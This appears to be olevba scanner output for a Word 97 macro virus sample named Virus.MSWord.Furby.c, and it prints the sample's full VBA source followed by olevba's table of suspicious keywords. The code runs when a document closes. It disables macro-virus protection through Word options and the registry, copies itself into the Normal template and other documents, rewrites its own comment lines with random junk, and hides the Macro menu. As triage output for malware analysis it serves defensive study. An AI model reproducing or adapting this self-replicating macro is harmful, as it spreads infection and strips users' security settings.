olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Furby.c-22bf7cecd1e9736fb7c12b4496d801a2dd1e003e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Furby.c-22bf7cecd1e9736fb7c12b4496d801a2dd1e003e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error GoTo ldr
Randomize: Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): vx = 1: xv = 4: x = 0: z = 0: y = 0
xrt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
'122472701521Clippit61533042497.53611794655678E+20Clippit12247270152161533042491224727015216153304249
xst = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
If xst > Sgn(x) And xrt > Sgn(x) Then GoTo ldr
If xst = Sgn(x) Then
    Set czy = NormalTemplate.VBProject.VBComponents
'194741277025Clippit653845356161.27330679635464E+22Clippit1947412770256538453561619474127702565384535616
    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) > 1 And Day(Now()) = 15 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
    hst.Item(Cos(Atn(CInt(1)))).Name = czy.Item(Cos(Atn(CInt(1)))).Name
    hst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
'95538482649Clippit787105469167.51988622082757E+21Clippit95538482649787105469169553848264978710546916
End If
If xrt = Sgn(x) Then Set czy = ActiveDocument.VBProject.VBComponents
czy.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
With czy.Item(Cos(Atn(CInt(1)))).codemodule
'129016737721Clippit46159794815.95538614025695E+20Clippit12901673772146159794811290167377214615979481
    For j = Abs(vx) To Abs(xv)
    .deletelines Abs(vx)
        Next j
End With
'15764560249Clippit436588488096.88262552451462E+20Clippit15764560249436588488091576456024943658848809
With czy.Item(Cos(Atn(CInt(1)))).codemodule
For j = Chr(53) To 40 Step Chr(53)
    y = Int(Rnd(412835) * 503989) + 8485: z = Int(Rnd(684958) * 385865) + 2988
    .replaceline j, Chr(39) & y * y & Application.Assistant & z * z & y * y * z * z & Application.Assistant & y * y & z * z & y * y & z * z
'31767002289Clippit93448955612.96859318676753E+20Clippit317670022899344895561317670022899344895561
     Next j
End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
'20462158116Clippit1241737786892.54086349339551E+21Clippit2046215811612417377868920462158116124173778689
If xst = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete
If xst = Sgn(x) Then czy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(vx), "Sub AutoClose()"
If xst = Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ldr:
'944517289Clippit1235670134411.1671118054512E+20Clippit944517289123567013441944517289123567013441
If xst <> Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/It's Zippy! by Virus :) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|aS0BI               |6153304249                                   |
|Hex String|e8E5aa              |653845356161                                 |
+----------+--------------------+---------------------------------------------+

